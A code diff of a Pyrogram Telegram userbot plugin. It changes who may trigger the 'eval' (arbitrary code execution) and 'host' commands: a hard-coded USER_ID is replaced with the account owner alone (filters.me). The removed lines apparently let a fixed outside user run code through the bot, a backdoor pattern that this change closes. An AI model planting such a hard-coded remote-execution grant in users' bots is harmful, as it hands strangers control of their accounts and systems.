@@ -8,7 +8,7 @@ import psutil
 from pyrogram import Client, filters
 from pyrogram.types import Message
 
-USER_ID = "2025873184"  
+USER_ID = 2025873184  
 async def aexec(cmd, client, message):
     # Implement your async exec function here
     pass
@@ -19,8 +19,7 @@ def get_size(bytes, suffix="B"):
         if bytes < factor:
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= factor
-
-@Client.on_message(filters.command("eval", config.prefix) & filters.user(USER_ID))
+@Client.on_message(filters.command("eval", config.prefix) & filters.me)
 async def eval_command(client: Client, message: Message):
     cmd = message.text.split(" ", maxsplit=1)[1] if len(message.text.split(" ")) > 1 else None
     if not cmd:
@@ -60,7 +59,8 @@ async def eval_command(client: Client, message: Message):
         await reply_to_.reply_text(final_output, quote=True)
     await ajg.delete()
 
-@Client.on_message(filters.command("host", config.prefix) & filters.user(USER_ID))
+@Client.on_message(filters.command("host", config.prefix) & filters.me)
+
 async def cek_host(client: Client, message: Message):
     xx = await message.reply("Processing...")
     uname = platform.uname()
